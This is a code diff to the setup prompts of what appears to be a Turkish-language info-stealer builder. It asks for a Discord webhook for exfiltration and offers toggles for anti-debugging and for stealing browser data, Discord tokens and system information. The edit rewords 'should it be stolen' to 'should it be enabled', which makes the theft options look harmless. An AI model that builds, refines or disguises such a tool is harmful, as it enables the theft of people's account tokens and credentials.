@@ -12,25 +12,25 @@ def get_config() -> dict:
         {
             "type": "input",
             "name": "webhook",
-            "message": "Webhook Urlnizi Giriniz",
+            "message": "Webhook URL'nizi girin",
             "validate": (lambda x: False if re.match(r"https://(discord.com|discordapp.com)/api/webhooks/\d+/\S+", x) is None else True)
         },
         {
             "type": "confirm",
             "name": "antidebug",
-            "message": "anti-debugging? Açılsın Mı?",
+            "message": "Anti-Debugging etkinleştirilsin mi?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "browsers",
-            "message": "Tarayıcı Bilgileri Çalınsınmı ?",
+            "message": "Tarayıcı Bilgileri Etkinleştirilsin mi?",
             "default": True,
         },
         {
             "type": "confirm",
             "name": "discordtoken",
-            "message": "Discord Token Bilgileri Çalınsınmı",
+            "message": "Discord Token Bilgileri Etkinleştirilsin mi?",
             "default": True,
         },
         {
@@ -48,7 +48,7 @@ def get_config() -> dict:
         {
             "type": "confirm",
             "name": "systeminfo",
-            "message": "Sistem Bilgileri Çalınsınmı?",
+            "message": "Sistem Bilgileri Etkinleştirilsin mi?",
             "default": True,
         },
     ]
